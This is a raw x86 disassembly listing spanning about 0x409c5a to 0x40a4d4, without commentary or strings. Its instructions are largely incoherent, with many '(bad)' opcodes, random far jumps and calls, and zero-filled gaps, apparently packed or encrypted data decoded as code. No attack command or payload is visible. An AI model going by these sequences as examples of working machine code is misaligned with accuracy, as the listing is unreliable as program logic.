  409c5a:	lea    esi,[eax]
  409c5c:	inc    esp
  409c5d:	and    dl,BYTE PTR [ecx+0x54]
  409c60:	add    esp,DWORD PTR [edx]
  409c62:	pop    esi
  409c63:	sub    BYTE PTR [eax],al
	...
  409c71:	add    BYTE PTR [eax],al
  409c73:	out    dx,al
  409c74:	cmp    BYTE PTR [esi+0x28],bl
  409c77:	sub    al,0x2d
  409c79:	and    DWORD PTR [ebx+0x24],esp
  409c7c:	and    al,BYTE PTR [esi+0x6e]
  409c7f:	adc    ebx,DWORD PTR [edx]
  409c81:	sub    BYTE PTR ds:[eax+ebx*4],dl
  409c85:	jmp    esp
  409c87:	cmp    ebx,DWORD PTR [eax+0x20794107]
  409c8d:	jmp    DWORD PTR [esi]
  409c8f:	dec    ebx
  409c90:	pop    eax
  409c91:	lock push ss
  409c93:	dec    ebx
  409c94:	and    ch,al
  409c96:	inc    ebp
  409c97:	and    BYTE PTR [edx],0xff
  409c9a:	push   cs
  409c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c9c:	sbb    ecx,ebp
  409c9e:	xor    al,0x85
  409ca0:	and    bh,bh
  409ca2:	inc    BYTE PTR [esi]
  409ca4:	push   ds
  409ca5:	call   0xff62b4a9
  409caa:	and    BYTE PTR [esi],bl
  409cac:	adc    DWORD PTR [eax],eax
  409cae:	cmp    al,0x38
  409cb0:	xor    DWORD PTR [ebx-0x50745b],eax
  409cb6:	inc    edx
  409cb7:	pop    ebx
  409cb8:	and    dh,BYTE PTR [ebp-0x1f]
  409cbb:	dec    eax
  409cbc:	arpl   WORD PTR [ebp+0x458c44c6],bx
  409cc2:	mov    ebp,0x283abaf7
  409cc7:	and    dh,BYTE PTR [di]
  409cca:	adc    al,0xa6
  409ccc:	(bad)  
  409ccd:	jmp    DWORD PTR [ebp+0x1be809b2]
  409cd3:	dec    edx
  409cd4:	and    bh,bh
  409cd6:	add    DWORD PTR [eax],eax
	...
  409ce4:	add    BYTE PTR [eax],al
  409ce6:	pushf  
  409ce7:	fiadd  WORD PTR [eax-0x17]
  409cea:	enter  0x3,0xe9
  409cee:	loopne 0x409d10
  409cf0:	jne    0x409ce3
  409cf2:	js     0x409c99
  409cf4:	cld    
  409cf5:	jbe    0x409c7b
  409cf7:	and    BYTE PTR [ebp+0x6d],dh
  409cfa:	jl     0x409c96
  409cfc:	pop    es
  409cfd:	push   ecx
  409cfe:	xchg   esi,eax
  409cff:	cmp    bh,0x5e
  409d02:	jbe    0x409d47
  409d04:	add    al,0xe9
  409d06:	adc    ecx,DWORD PTR [esp+ebp*8-0x1e65c98]
  409d0d:	add    BYTE PTR [ebp+0x300069e8],ah
  409d13:	push   cs
  409d14:	push   DWORD PTR [ebp+0x2]
  409d17:	std    
  409d18:	jno    0x409cb7
  409d1a:	xor    eax,0x464588e8
  409d1f:	add    DWORD PTR [ebx],0x8d050a01
  409d25:	test   DWORD PTR [ebp-0x19],ecx
  409d28:	(bad)  
  409d29:	jmp    FWORD PTR [edx-0x358e2e04]
  409d2f:	add    al,0xb
  409d31:	ror    BYTE PTR [esi+0x38],0x3c
  409d35:	add    al,0xbb
  409d37:	add    al,0x0
  409d39:	ja     0x409cda
  409d3b:	jl     0x409dab
  409d3d:	cmp    ecx,DWORD PTR [ebx-0x727a72f7]
  409d43:	jmp    0xa3a9:0x16afffe
	...
  409d56:	add    BYTE PTR [eax],al
  409d58:	add    BYTE PTR [ebp-0x7597b019],dl
  409d5e:	add    al,0xef
  409d60:	mov    esi,0x874e87a
  409d65:	mov    ds:0xb5ffc0e5,al
  409d6a:	cld    
  409d6b:	cmc    
  409d6c:	lahf   
  409d6d:	(bad)
  409d70:	jne    0x409d48
  409d72:	out    0x74,eax
  409d74:	or     dl,ah
  409d76:	sbb    DWORD PTR [edi+edi*8+0x4c1e1d5],0xec8a354a
  409d81:	leave  
  409d82:	loopne 0x409d7f
  409d84:	push   0x3a
  409d86:	jle    0x409da5
  409d88:	dec    DWORD PTR [edi+0x1c]
  409d8b:	out    0xd,eax
  409d8d:	out    0xe6,eax
  409d8f:	dec    BYTE PTR [ecx+0x67e7ff]
  409d95:	arpl   WORD PTR [esi],bp
  409d97:	push   ss
  409d98:	mov    esi,0x40ea51bb
  409d9d:	arpl   WORD PTR [esi],si
  409d9f:	jl     0x409ddc
  409da1:	mov    ds:0x5b75262e,al
  409da6:	(bad)  
  409da7:	dec    edi
  409da8:	les    eax,FWORD PTR [edi+ebp*8]
  409dab:	and    eax,0xafe6ff75
  409db0:	pop    es
  409db1:	or     edx,DWORD PTR [eax-0x78]
  409db4:	(bad)  
  409db5:	in     al,dx
  409db6:	in     al,0x40
  409db8:	add    al,0x63
  409dba:	pop    ecx
  409dbb:	jp     0x409da9
	...
  409dc9:	add    BYTE PTR [eax],al
  409dcb:	add    dl,ah
  409dcd:	icebp  
  409dce:	dec    esi
  409dcf:	not    esp
  409dd1:	push   ds
  409dd2:	ja     0x409e19
  409dd4:	iret   
  409dd5:	jge    0x409dfd
  409dd7:	jne    0x409e4c
  409dd9:	das    
  409dda:	scas   eax,DWORD PTR es:[edi]
  409ddb:	or     ecx,ebx
  409ddd:	inc    ecx
  409dde:	mov    bl,0xff
  409de0:	mov    ah,0x12
  409de2:	inc    ebx
  409de3:	(bad)  
  409de5:	inc    ecx
  409de6:	add    eax,DWORD PTR [eax]
  409de8:	arpl   WORD PTR [edi-0x41],sp
  409deb:	mul    DWORD PTR [ebx+0x2e]
  409dee:	add    eax,DWORD PTR [eax]
  409df0:	pushf  
  409df1:	call   0x2ea59d25
  409df6:	add    ebp,DWORD PTR [edx+0x63]
  409df9:	les    eax,FWORD PTR [ebx]
  409dfb:	push   0x63
  409dfd:	hlt    
  409dfe:	add    ecx,DWORD PTR [ebp-0x732b85e2]
  409e04:	out    0x81,al
  409e06:	sub    eax,0x24dd64ff
  409e0b:	jne    0x409e68
  409e0d:	mov    BYTE PTR [edi-0x4c98b405],ch
  409e13:	dec    DWORD PTR [esp+0x43]
  409e17:	je     0x409e77
  409e19:	test   DWORD PTR [ebp+0x1],ebp
  409e1c:	arpl   WORD PTR ds:0xee1e9be9,ax
  409e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e23:	add    ebp,DWORD PTR [ecx+ebx*4]
  409e26:	clc    
  409e27:	sbb    edi,DWORD PTR [edx]
  409e29:	fs dec esi
  409e2b:	and    eax,0x77198ab3
	...
  409e3c:	add    BYTE PTR [eax],al
  409e3e:	add    dh,bl
  409e40:	sbb    DWORD PTR [esi],esi
  409e42:	and    eax,0x1b9ab60c
  409e47:	sub    ah,BYTE PTR [esi+ebp*1+0x25]
  409e4b:	jmp    0x111e:0xf42d1988
  409e52:	aad    0xcd
  409e54:	push   ds
  409e55:	push   ss
  409e56:	ja     0x409e36
  409e58:	and    eax,0xb5dc2516
  409e5d:	nop
  409e5e:	nop
  409e5f:	cwde   
  409e60:	(bad)  
  409e61:	call   0xfe56b48a
  409e66:	and    al,0xc4
  409e68:	push   ds
  409e69:	je     0x409e62
  409e6b:	(bad)  
  409e6c:	lock mov ah,BYTE PTR [esp+esi*4]
  409e70:	mov    WORD PTR [edi+ebx*1-0x4c],fs
  409e74:	push   ds
  409e75:	(bad)  
  409e76:	cdq    
  409e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e79:	ins    BYTE PTR es:[edi],dx
  409e7a:	call   0x6f06a3a2
  409e7f:	xchg   ebx,eax
  409e80:	push   ss
  409e81:	mov    esi,0xe4988c24
  409e86:	sbb    esi,DWORD PTR [ecx+0x63]
  409e89:	scas   al,BYTE PTR es:[edi]
  409e8a:	and    al,0xea
  409e8c:	mov    BYTE PTR [ebp+0x131e742c],dl
  409e92:	add    al,0xfb
  409e94:	fs rol dl,cl
  409e97:	fs pop ds
  409e99:	push   esp
  409e9a:	xor    edx,DWORD PTR [esi+ebx*1-0x7a]
  409e9e:	and    al,0xce
  409ea0:	adc    DWORD PTR [ecx+0x2c],edx
	...
  409eb2:	add    bl,BYTE PTR [esi]
  409eb4:	add    BYTE PTR [esi-0x37],dh
  409eb7:	mov    al,ch
  409eb9:	jbe    0x409e42
  409ebb:	push   ds
  409ebc:	push   0xffffffe9
  409ebe:	fsubr  DWORD PTR [ebx+edi*1-0x58]
  409ec2:	pusha  
  409ec3:	push   ds
  409ec4:	mov    ch,0x59
  409ec6:	ja     0x409ee6
  409ec8:	dec    DWORD PTR [esi-0x33]
  409ecb:	or     eax,ebp
  409ecd:	and    eax,0x70ff1e81
  409ed2:	lea    eax,[ecx-0x9]
  409ed5:	ss aas 
  409ed7:	stos   DWORD PTR es:[edi],eax
  409ed8:	inc    eax
  409eda:	(bad)  
  409edb:	fiadd  DWORD PTR [eax-0x17]
  409ede:	aas    
  409edf:	pop    eax
  409ee0:	lock push ss
  409ee2:	inc    edi
  409ee3:	push   ds
  409ee4:	call   FWORD PTR [esp+ebp*8-0x78b73edb]
  409eeb:	push   ds
  409eec:	mov    DWORD PTR [eax+ebp*1+0x16],ebp
  409ef0:	(bad)  
  409ef1:	(bad)  
  409ef2:	jmp    0x409f11
  409ef4:	addr16 cli 
  409ef6:	mov    esp,0x4eedffc4
  409efb:	adc    eax,0x1e80e6f7
  409f00:	jne    0x409eef
  409f02:	js     0x409f6b
  409f04:	mov    eax,ds:0x858c80d6
  409f09:	mov    ch,0x78
  409f0b:	push   ds
  409f0c:	jmp    FWORD PTR [edx+0x2]
  409f0f:	sub    edi,esi
  409f11:	mov    esi,0x30740540
	...
  409f22:	add    BYTE PTR [eax],al
  409f24:	add    ah,bl
  409f26:	pop    edi
  409f27:	in     al,dx
  409f28:	mov    dh,0x40
  409f2a:	push   ds
  409f2b:	add    BYTE PTR ds:0x91bd82cf,bl
  409f31:	dec    eax
  409f32:	push   ds
  409f33:	(bad)  
  409f34:	jmp    0xf9a84605
  409f39:	pusha  
  409f3a:	sub    al,0xbe
  409f3c:	add    ch,bl
  409f3e:	jle    0x409f47
  409f40:	call   0x3f3b38
  409f45:	int    0xbe
  409f47:	jmp    0x409f40
  409f49:	int    0xe8
  409f4b:	(bad)  
  409f4c:	jne    0x409f80
  409f4e:	icebp  
  409f4f:	cmp    al,0x9b
  409f51:	(bad)  
  409f52:	call   0xe35555
  409f57:	(bad)  
  409f58:	jmp    FWORD PTR [ebp+0x6de8077e]
  409f5e:	pushf  
  409f5f:	(bad)  
  409f60:	dec    DWORD PTR [ebp-0x42]
  409f63:	fcomip st,st(7)
  409f65:	dec    ebp
  409f66:	call   0xe75569
  409f6b:	(bad)  
  409f6c:	(bad)  
  409f6d:	cmp    eax,0x5de8077e
  409f72:	fwait
  409f73:	(bad)  
  409f74:	dec    DWORD PTR [ebp-0x42]
  409f77:	xlat   BYTE PTR ds:[ebx]
  409f78:	imul   DWORD PTR [ebp-0x18]
  409f7b:	(bad)  
  409f7c:	jne    0x409f50
  409f7e:	lock or al,0x9b
  409f81:	int    0xe7
  409f83:	(bad)  
  409f84:	mov    ch,0x6e
  409f86:	add    bh,bh
  409f88:	inc    DWORD PTR [eax]
	...
  409f96:	add    BYTE PTR [eax],al
  409f98:	int    0x7d
  409f9a:	pop    es
  409f9b:	call   0x3f3a5d
  409fa0:	lea    edi,[ebp-0x1872082d]
  409fa6:	(bad)  
  409fa7:	jne    0x409f2b
  409fa9:	lock lock call 0xffa6:0xb5fee79d
  409fb2:	(bad)  
  409fb3:	jmp    DWORD PTR [edx-0x32006305]
  409fb9:	out    0xb4,eax
  409fbb:	in     al,dx
  409fbc:	aad    0xe7
  409fbe:	(bad)  
  409fbf:	call   0x40258e
  409fc4:	arpl   WORD PTR [ebx+0x58],si
  409fc7:	call   0xe8632b20
  409fcc:	mov    eax,ds:0xd14cff21
  409fd2:	test   DWORD PTR ds:[ebx+edx*4+0x2a],0x21aadeda
  409fdb:	(bad)  
  409fdc:	out    dx,al
  409fdd:	lds    ebx,FWORD PTR [ecx]
  409fdf:	jmp    FWORD PTR [esi+esi*4]
  409fe2:	push   ecx
  409fe3:	popf   
  409fe4:	and    al,0xb3
  409fe6:	and    DWORD PTR [ebp-0xde4cc9],esi
  409fec:	or     ebp,edx
  409fee:	jg     0x409fef
  409ff0:	or     al,0xdb
  409ff2:	push   edi
  409ff3:	lock or al,0xd3
  409ff6:	and    edi,edi
  409ff8:	jbe    0x40a034
  409ffa:	and    dh,BYTE PTR [ebp+0x0]
	...
  40a009:	add    BYTE PTR [eax],al
  40a00b:	imul   esi,esi,0x9
  40a00e:	(bad)  
  40a00f:	in     al,dx
  40a010:	cli    
  40a011:	and    DWORD PTR [ebp-0xde050d],esi
  40a017:	retf   
  40a018:	lds    edi,FWORD PTR [edi-0x1]
  40a01b:	aam    0x2
  40a01d:	enter  0xbaf7,0x26
  40a021:	and    edi,edi
  40a023:	les    edx,FWORD PTR [edx]
  40a025:	xchg   edi,eax
  40a026:	sti    
  40a027:	retf   
  40a028:	pop    ds
  40a029:	mov    cl,0xff
  40a02b:	mov    ah,0x54
  40a02d:	inc    esi
  40a02e:	or     al,0x63
  40a030:	ror    DWORD PTR [esp+ebp*8+0x6a2069e0],1
  40a037:	arpl   ax,cx
  40a039:	add    bh,bh
  40a03b:	push   cs
  40a03c:	push   ss
  40a03d:	sub    edi,DWORD PTR [edx-0x76dea517]
  40a043:	push   ds
  40a044:	push   edx
  40a045:	lods   al,BYTE PTR ds:[esi]
  40a046:	mov    ebx,0xff03ed38
  40a04b:	cs add eax,0x523eb3c
  40a051:	sahf   
  40a052:	xchg   edi,eax
  40a053:	pop    esp
  40a054:	sub    eax,0x1b5c1fa9
  40a059:	add    DWORD PTR [eax-0x68],esp
  40a05c:	(bad)  
  40a05d:	call   0xe946030d
  40a062:	add    DWORD PTR [ecx+edx*4-0x20],0x2b
  40a067:	or     eax,0x34216e19
  40a06c:	xchg   ecx,eax
  40a06d:	and    DWORD PTR fs:[eax],eax
	...
  40a07c:	add    BYTE PTR [eax],al
  40a07e:	mov    dh,0xd
  40a080:	push   ecx
  40a081:	dec    edi
  40a082:	leave  
  40a083:	sbb    dl,BYTE PTR [esi+0x4b]
  40a086:	and    DWORD PTR [edx],eax
  40a088:	jmp    0x6a6a8a43
  40a08d:	dec    eax
  40a08e:	lfs    edx,FWORD PTR [ebp+0x8ad04ad]
  40a095:	and    DWORD PTR [esi+0xd],esi
  40a098:	inc    ecx
  40a099:	mov    cl,0xda
  40a09b:	sbb    ah,BYTE PTR [esi]
  40a09d:	mov    esp,DWORD PTR [esi+0x76d77219]
  40a0a3:	in     eax,dx
  40a0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a5:	add    ebp,eax
  40a0a7:	fcomp  DWORD PTR [edx+0x690523eb]
  40a0ad:	loope  0x40a07b
  40a0af:	xchg   esi,eax
  40a0b0:	xchg   DWORD PTR [ebx+0x3a7d95a],ebp
  40a0b6:	adc    eax,0xb4b1352d
  40a0bb:	sbb    bh,BYTE PTR [ecx]
  40a0bd:	lods   al,BYTE PTR ds:[esi]
  40a0be:	scas   al,BYTE PTR es:[edi]
  40a0bf:	fisub  WORD PTR [edi]
  40a0c1:	add    al,0xc
  40a0c3:	sub    eax,0x1a9cb081
  40a0c8:	xor    ecx,DWORD PTR ds:0xcec90a3
  40a0ce:	mov    cl,0x91
  40a0d0:	adc    bh,BYTE PTR [edx-0x70ffbc84]
  40a0d6:	inc    ebx
  40a0d7:	sbb    ch,BYTE PTR [eax-0x29]
  40a0da:	xchg   esp,eax
  40a0db:	(bad)  
  40a0de:	aas    
  40a0df:	and    BYTE PTR [eax+0x9e],ah
	...
  40a0f1:	inc    ebx
  40a0f2:	mov    ch,0x67
  40a0f4:	jmp    0x1fecb59
  40a0f9:	push   eax
  40a0fa:	fiadd  WORD PTR [eax-0x17]
  40a0fd:	adc    BYTE PTR [ebx],bl
  40a0ff:	jne    0x40a0f2
  40a101:	js     0x40a16b
  40a103:	shl    DWORD PTR [esi-0x7d],0x2d
  40a107:	(bad)  [ebp-0x7d]
  40a10a:	sbb    ch,bl
  40a10c:	call   0xe97e3b2b
  40a111:	int    0x1b
  40a113:	inc    esi
  40a114:	push   ebp
  40a115:	aaa    
  40a116:	pop    edx
  40a117:	mov    ecx,0xff1a434e
  40a11c:	cmp    edx,DWORD PTR [edx-0x1c4bf923]
  40a122:	sbb    DWORD PTR [ebp+0x35],esi
  40a125:	inc    ebx
  40a126:	nop
  40a127:	pop    es
  40a128:	inc    ecx
  40a129:	or     eax,0x2326ff7c
  40a12e:	mov    eax,0x55c2bc8
  40a133:	push   ebp
  40a134:	bound  ecx,QWORD PTR [esi+eax*4-0x6f7cf23c]
  40a13b:	or     eax,DWORD PTR [esi]
  40a13d:	cmc    
  40a13e:	add    eax,ebp
  40a140:	lds    ecx,FWORD PTR [ebx+0x1a]
  40a143:	jmp    DWORD PTR [eax-0x5b]
  40a146:	sbb    eax,0x1a5474ff
  40a14b:	jne    0x40a13e
  40a14d:	js     0x40a1c0
  40a14f:	xchg   esp,eax
  40a150:	fiadd  WORD PTR [esi+ecx*4+0x4d]
  40a154:	in     eax,0x0
	...
  40a162:	add    BYTE PTR [eax],al
  40a164:	imul   eax,DWORD PTR [ebp+0x74],0xffdbe02b
  40a16b:	dec    DWORD PTR [esi+0x24]
  40a16e:	(bad)  
  40a16f:	jne    0x40a137
  40a171:	call   0xf9f63e0a
  40a176:	dec    edi
  40a177:	jmp    FWORD PTR [edi]
  40a179:	cmc    
  40a17a:	(bad)  
  40a17b:	jne    0x40a143
  40a17d:	push   eax
  40a17e:	(bad)  
  40a17f:	jne    0x40a1f3
  40a181:	in     eax,dx
  40a182:	retf   
  40a183:	xchg   esi,eax
  40a184:	cmc    
  40a185:	clc    
  40a186:	pop    ecx
  40a187:	mov    esi,DWORD PTR [edi-0xb]
  40a18a:	cmp    BYTE PTR [ecx],0x3a
  40a18d:	jle    0x40a198
  40a18f:	push   edx
  40a190:	repnz pop eax
  40a192:	fwait
  40a193:	push   DWORD PTR [ebp+0xeebbf2c]
  40a199:	test   BYTE PTR [ebp+0x10],bh
  40a19c:	cmp    dh,BYTE PTR [ecx+0x7]
  40a19f:	mov    edi,edi
  40a1a1:	adc    al,0xfe
  40a1a3:	jne    0x40a15b
  40a1a5:	mov    BYTE PTR [eax],al
  40a1a7:	mov    ecx,DWORD PTR [eax-0x14]
  40a1aa:	add    DWORD PTR [ebx],ebp
  40a1ac:	cmp    cl,dl
  40a1ae:	ror    DWORD PTR [edx+edi*8],0x5d
  40a1b2:	mov    ch,ah
  40a1b4:	xor    eax,0xafff0b7e
  40a1b9:	or     al,0xe8
  40a1bb:	mov    ecx,0xfffef86c
  40a1c0:	iret   
  40a1c1:	or     BYTE PTR [eax-0x1],dl
  40a1c4:	dec    DWORD PTR [eax+ebp*8]
  40a1c7:	xor    DWORD PTR [eax],eax
	...
  40a1d5:	add    BYTE PTR [eax],al
  40a1d7:	dec    ebp
  40a1d8:	clc    
  40a1d9:	dec    cl
  40a1db:	js     0x40a1e6
  40a1dd:	add    BYTE PTR [ebp+0x51],dl
  40a1e0:	aad    0x82
  40a1e2:	les    ecx,FWORD PTR [edx+0x4953564f]
  40a1e8:	popw   es
  40a1ea:	add    BYTE PTR [esi],cl
  40a1ec:	adc    eax,DWORD PTR [edx+0x7404b67d]
  40a1f2:	or     al,0x63
  40a1f4:	stos   DWORD PTR es:[edi],eax
  40a1f5:	lahf   
  40a1f6:	packsswb mm6,QWORD PTR [edx+0x3a0e8305]
  40a1fd:	add    esi,DWORD PTR [ebp+0x5a]
  40a200:	repz inc ebx
  40a202:	pop    ebx
  40a203:	sbb    al,0xf0
  40a205:	dec    esp
  40a206:	ret    0x2e53
  40a209:	mov    al,BYTE PTR [ebp+0x5f]
  40a20c:	stos   DWORD PTR es:[edi],eax
  40a20d:	and    al,BYTE PTR [edi]
  40a20f:	loopne 0x40a20a
  40a211:	lldt   di
  40a214:	sub    cl,BYTE PTR [edx]
  40a216:	ror    bh,0x25
  40a219:	jmp    0x21c8:0xbddfa8bf
  40a220:	add    ecx,DWORD PTR ds:[ebx-0x1f7dc55a]
  40a227:	pop    esp
  40a228:	stos   DWORD PTR es:[edi],eax
  40a229:	lahf   
  40a22a:	adc    esp,DWORD PTR [ebx+0x3a]
  40a22d:	pop    es
  40a22e:	or     esp,DWORD PTR [ebx]
  40a230:	xor    cl,BYTE PTR [ebx+ebp*1]
  40a233:	and    edx,DWORD PTR [ebx-0x42]
  40a236:	pop    ebp
  40a237:	sub    ch,ah
  40a239:	repnz inc DWORD PTR [eax]
	...
  40a248:	add    BYTE PTR [eax],al
  40a24a:	cmp    ebx,esp
  40a24c:	sbb    eax,0xc7a75775
  40a251:	mov    edi,0xb4368e0
  40a256:	hlt    
  40a257:	push   eax
  40a258:	inc    ebx
  40a259:	call   0xff5f257d
  40a25e:	out    0x94,eax
  40a260:	mov    ebx,0xbe4770e8
  40a266:	or     DWORD PTR [edx-0x3c],0xffffffff
  40a26a:	or     edx,DWORD PTR [ebx]
  40a26c:	add    eax,DWORD PTR [eax]
  40a26e:	arpl   WORD PTR [ebx],bx
  40a270:	mov    si,WORD PTR [esi]
  40a273:	mov    cl,BYTE PTR es:[ebp+0x67]
  40a277:	sbb    esp,DWORD PTR [esi-0x73]
  40a27a:	es add eax,0x91a5b4d9
  40a280:	test   al,0x1d
  40a282:	push   ss
  40a283:	inc    ecx
  40a284:	rol    DWORD PTR [esi+edi*4+0x17],0xce
  40a289:	sbb    eax,0x81d14116
  40a28e:	call   0xf65e60aa
  40a293:	or     BYTE PTR [esi-0x39],ah
  40a296:	mov    ah,0x83
  40a298:	and    al,0x44
  40a29a:	dec    eax
  40a29b:	sbb    BYTE PTR [esp+eax*2],bl
  40a29e:	jnp    0x40a22c
  40a2a0:	sbb    BYTE PTR ds:0x482c8d5c,0x57
  40a2a7:	lea    esp,[eax+ecx*2]
  40a2aa:	ficom  WORD PTR [eax+0x8978]
	...
  40a2bc:	add    dh,al
  40a2be:	inc    ecx
  40a2bf:	inc    eax
  40a2c0:	hlt    
  40a2c1:	cmp    al,0x17
  40a2c3:	jmp    0xc998a1d8
  40a2c8:	fbld   TBYTE PTR [ebx+0x6309a005]
  40a2ce:	add    eax,0x8ac710e9
  40a2d3:	fmul   QWORD PTR [ebx]
  40a2d5:	call   0xc7517fa2
  40a2da:	mov    BYTE PTR [ebx+eiz*1+0x43b416b3],ch
  40a2e1:	cld    
  40a2e2:	nop
  40a2e3:	sub    al,0x2c
  40a2e5:	test   BYTE PTR [eax+0x2e],ah
  40a2e8:	sbb    eax,0x2c2c90ec
  40a2ed:	xor    DWORD PTR [edx+0x1e],edi
  40a2f0:	sbb    eax,0x139c88df
  40a2f5:	out    0x98,al
  40a2f7:	and    BYTE PTR [ebx+0x73],bl
  40a2fa:	add    eax,0x61d003e9
  40a2ff:	ins    BYTE PTR es:[edi],dx
  40a300:	xchg   edi,eax
  40a301:	pushf  
  40a302:	pop    esp
  40a303:	add    cl,ah
  40a305:	pusha  
  40a306:	add    eax,0xab44fa00
  40a30b:	add    BYTE PTR [ebp+ebx*4+0x3e],dh
  40a30f:	push   eax
  40a310:	ror    DWORD PTR [edx-0x77],1
  40a313:	add    cl,ch
  40a315:	jmp    0x40a2a7
  40a317:	punpckldq mm5,mm5
  40a31a:	repnz rcl dh,0x63
  40a31e:	or     bh,bh
  40a320:	xor    eax,0x0
	...
  40a32d:	add    BYTE PTR [eax],al
  40a32f:	add    dh,al
  40a331:	sub    ecx,DWORD PTR [edi]
  40a333:	fs popf 
  40a335:	push   ds
  40a336:	push   eax
  40a337:	pop    ss
  40a338:	mov    ch,0x1e
  40a33a:	jnp    0x40a3b2
  40a33c:	pusha  
  40a33d:	add    eax,0xc668a783
  40a342:	or     dl,BYTE PTR [esi+0x570f28ed]
  40a348:	es pop ss
  40a34a:	add    DWORD PTR [ecx-0x2dfe71a8],0x50
  40a351:	jmp    0xe96a:0x2771d974
  40a358:	cli    
  40a359:	adc    eax,0x15fae969
  40a35e:	push   ebp
  40a35f:	pop    esi
  40a360:	cmc    
  40a361:	add    eax,0x15cae96a
  40a366:	out    0xf,eax
  40a368:	rcl    DWORD PTR ds:0x91a0f2ff,cl
  40a36e:	sub    BYTE PTR [ecx+0x53d41db0],bl
  40a374:	push   edi
  40a375:	push   ss
  40a376:	mov    edx,DWORD PTR [ecx]
  40a378:	test   eax,0x6092ffab
  40a37d:	mov    ah,0x52
  40a37f:	mov    bh,0x7f
  40a381:	nop
  40a382:	jae    0x1404ee8
  40a388:	int    0xa9
  40a38a:	(bad)  
  40a38b:	(bad)  
  40a38c:	mov    edx,0xb275c00c
  40a391:	push   esp
  40a392:	out    0x9d,eax
	...
  40a3a0:	add    BYTE PTR [eax],al
  40a3a2:	add    BYTE PTR [eax],dl
  40a3a4:	stc    
  40a3a5:	(bad)  
  40a3a6:	sub    edx,DWORD PTR [ecx-0x73]
  40a3a9:	ret    
  40a3aa:	pop    ebx
  40a3ab:	sbb    eax,0x9ac2c85b
  40a3b0:	add    DWORD PTR [ebp-0x75],edx
  40a3b3:	sahf   
  40a3b4:	jge    0x40a37a
  40a3b6:	lock push ebp
  40a3b8:	dec    esi
  40a3b9:	sub    bl,bl
  40a3bb:	popf   
  40a3bc:	jae    0x40a3c9
  40a3be:	push   DWORD PTR [edi]
  40a3c0:	or     eax,ebp
  40a3c2:	add    DWORD PTR [edi],edx
  40a3c4:	cli    
  40a3c5:	(bad)  
  40a3c6:	push   eax
  40a3c7:	mov    ebp,0x4e80773
  40a3cc:	xchg   ebx,eax
  40a3cd:	(bad)  
  40a3ce:	call   ecx
  40a3d0:	icebp  
  40a3d1:	push   edi
  40a3d2:	add    esi,edx
  40a3d4:	add    al,0xc0
  40a3d6:	je     0x40a35d
  40a3d8:	jle    0x40a41f
  40a3da:	hlt    
  40a3db:	push   0xfffffff0
  40a3dd:	je     0x40a3eb
  40a3df:	mov    ebp,0xa1e80776
  40a3e4:	out    dx,al
  40a3e5:	(bad)  
  40a3e6:	inc    ebx
  40a3e8:	inc    esi
  40a3e9:	sti    
  40a3ea:	(bad)  
  40a3eb:	idiv   eax
  40a3ed:	dec    edi
  40a3ee:	push   DWORD PTR [edi]
  40a3f0:	or     eax,0xe10275ff
  40a3f5:	cwde   
  40a3f6:	std    
  40a3f7:	popf   
  40a3f8:	lock mov BYTE PTR [ebp-0x5e],al
  40a3fc:	lock je 0x40a3ef
  40a3ff:	cmp    eax,0xb7fff776
  40a404:	add    al,0xff
  40a406:	jne    0x40a408
	...
  40a414:	add    BYTE PTR [eax],al
  40a416:	ds loope 0x40a429
  40a419:	(bad)  
  40a41a:	cmp    eax,0x7dd88af0
  40a41f:	jbe    0x40a41c
  40a421:	call   0xffbdee89
  40a426:	int3   
  40a427:	add    edx,DWORD PTR [ecx+0x7d42bbf7]
  40a42d:	(bad)  
  40a42e:	mov    esp,0xb4570378
  40a433:	xchg   ecx,eax
  40a434:	or     ch,al
  40a436:	sti    
  40a437:	lods   eax,DWORD PTR ds:[esi]
  40a438:	sbb    bh,bh
  40a43a:	fcomp  DWORD PTR [edi-0x42]
  40a43d:	pop    esi
  40a43e:	stos   BYTE PTR es:[edi],al
  40a43f:	pusha  
  40a440:	or     eax,DWORD PTR [eax]
  40a442:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a444:	or     DWORD PTR es:[esi],0x32
  40a448:	add    DWORD PTR [edx+0x42],esi
  40a44b:	dec    ebx
  40a44c:	nop
  40a44d:	(bad)  
  40a44f:	(bad)  [ebx]
  40a451:	call   0xff5a5738
  40a456:	ins    BYTE PTR es:[edi],dx
  40a457:	fpatan 
  40a459:	(bad)  
  40a45a:	out    dx,al
  40a45b:	adc    eax,0x735eaf2b
  40a460:	sbb    bh,bh
  40a462:	into   
  40a463:	push   cs
  40a464:	sbb    dh,BYTE PTR [ebp+0x5b]
  40a467:	xchg   BYTE PTR [edi-0x3],bl
  40a46a:	inc    esp
  40a46b:	mov    ebx,DWORD PTR [edx]
  40a46d:	jne    0x40a4c2
  40a46f:	xchg   ebx,eax
  40a470:	pop    DWORD PTR [edi]
  40a472:	dec    ebx
  40a473:	call   0xa76da392
  40a478:	scas   eax,DWORD PTR es:[edi]
  40a479:	adc    eax,DWORD PTR [eax]
	...
  40a487:	add    BYTE PTR [eax],al
  40a489:	ficomp DWORD PTR [edi]
  40a48b:	sbb    dh,BYTE PTR [ebp+0x73]
  40a48e:	mov    bl,0x8f
  40a490:	pop    es
  40a491:	or     esp,DWORD PTR [ebp-0x60f300e9]
  40a497:	xchg   edi,eax
  40a498:	or     esp,DWORD PTR [eax+0x54]
  40a49b:	icebp  
  40a49c:	(bad)  
  40a49d:	jbe    0x40a4cd
  40a49f:	sbb    dh,BYTE PTR [ebp+0x6b]
  40a4a2:	(bad)  
  40a4a3:	call   0x5375:0x19e2ecfc
  40a4aa:	add    eax,0x1d649026
  40a4af:	mov    WORD PTR [eax],ds
  40a4b1:	aam    0x13
  40a4b3:	push   ss
  40a4b4:	nop
  40a4b5:	pop    esp
  40a4b6:	lahf   
  40a4b7:	lock sbb cl,BYTE PTR [esi-0x3]
  40a4bb:	adc    BYTE PTR [esi-0x29],ch
  40a4be:	adc    edi,esi
  40a4c0:	sbb    DWORD PTR [esi],ebp
  40a4c2:	cmc    
  40a4c3:	cmc    
  40a4c4:	(bad)  
  40a4c5:	fs sbb eax,0x13a46fcd
  40a4cb:	mov    al,0x46
  40a4cd:	jae    0x40a4d4
  40a4cf:	xor    al,0x8d
  40a4d1:	xchg   DWORD PTR [ebx],edx
  40a4d3:	pop    esp
  40a4d4:	or     cl,bh
